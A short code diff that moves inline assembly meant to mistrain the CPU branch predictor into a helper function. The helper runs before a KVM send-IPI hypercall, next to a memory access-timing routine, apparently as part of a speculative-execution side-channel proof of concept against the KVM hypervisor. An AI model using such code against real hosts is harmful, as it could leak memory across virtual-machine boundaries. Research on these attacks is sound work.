@@ -48,6 +48,17 @@ static inline __attribute__((always_inline)) size_t access_time(void __user *ptr
   return time;
 }
 
+static inline __attribute__((always_inline)) void confuse_branch_predictor(void) {
+  // Confuse the branch predictor
+  asm volatile("movq $0, %%rcx\n"
+               "cmpq $0, %%rcx\n"
+               ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
+               "je 1f\n"
+               "1:\n"
+               ".endr\n" ::
+                   : "rcx");
+}
+
 static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
   struct send_ipi_hypercall opts;
 
@@ -61,16 +72,9 @@ static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t
     return -EFAULT;
   }
 
-  int type = KVM_HC_SEND_IPI;
+  confuse_branch_predictor();
 
-  // Confuse the branch predictor
-  asm volatile("movq $0, %%rcx\n"
-               "cmpq $0, %%rcx\n"
-               ".rept 300\n" // TODO: optimize this, maybe 300 is too much/too little?
-               "je 1f\n"
-               "1:\n"
-               ".endr\n" ::
-                   : "rcx");
+  int type = KVM_HC_SEND_IPI;
 
   // Do the vmcall once with valid values
   asm volatile("vmcall"
